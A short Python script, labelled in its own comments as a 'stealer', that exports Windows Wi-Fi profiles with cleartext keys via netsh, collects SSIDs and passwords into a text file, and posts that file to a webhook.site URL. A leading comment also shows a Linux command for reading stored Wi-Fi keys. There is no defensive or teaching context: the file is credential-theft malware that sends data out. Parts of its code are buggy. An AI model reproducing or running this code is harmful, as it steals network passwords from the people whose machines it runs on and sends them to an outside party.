# sudo grep -r '^psk=' /etc/NetworkManager/system-connections/

import subprocess
import os
import sys
import requests

# stealer url
url = 'https://webhook.site/df2d35f2-acdf-47c9-8739-383b7d97e749'


# create a file
password_file = open('passwords.txt','w')
password_file.write('Hello, sir!\n Here are your passwords:\n\n')
password_file.close()

# lists
wifi_files = []
wifi_names = []
wifi_passwords = []

# use python to execute a windows commad
command = subprocess.run(['netsh','wlan','export','profile','key=clear'],capture_output=True).stdout.decode()

# grab current directory
path = os.getcwd()

# do the hackies
for filename in os.listdir(path):
    if filename.startswith('Wi-Fi') and filename.endswith('.xml'):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i,'r') as f:
                for line in f.readlines:
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_names.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = stripped[:-14]
                        wifi_passwords.append(back)
                        for x,y in zip(wifi_names, wifi_passwords):
                            sys.stdout = open('passwords.txt','a')
                            print('SSID: ' + x, 'Password: ' + y, sep='\n')
                            sys.stdout.close()
                        

# send the hackies
with open('passwords.txt','rb') as f:
    r = requests.post(url,data=f)